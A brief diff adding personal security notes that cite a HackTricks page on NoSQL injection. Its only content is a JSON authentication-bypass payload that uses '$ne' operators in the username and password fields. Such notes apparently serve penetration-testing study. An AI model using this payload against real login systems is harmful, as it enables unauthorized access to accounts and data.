@@ -1,0 +1,5 @@
+https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
+
+Basic authentication bypass:
+#in JSON
+{"username": {"$ne": null}, "password": {"$ne": null} }
